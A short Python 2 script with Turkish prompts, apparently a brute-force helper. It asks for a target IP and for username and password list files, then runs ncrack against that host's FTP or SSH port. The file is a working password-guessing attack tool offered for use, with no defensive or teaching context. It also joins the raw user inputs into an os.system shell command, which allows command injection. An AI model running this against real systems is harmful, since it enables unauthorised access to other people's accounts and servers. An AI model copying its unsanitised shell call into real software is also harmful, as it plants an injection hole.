#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

print("""
Port Kaba Kuvvet
1) FTP
2) SSH

""")

islemno = raw_input("İşlem No Girin: ")
hedefip = raw_input("Hedef IP Girin: ")
kullaniciadi = raw_input("Kullanıcı Adları Dosya Yolu: ")
sifre = raw_input("Şifrelerin Bulunduğu Dosya Yolu: ")

if(islemno == "1"):
	os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

elif(islemno == "2"):
	os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
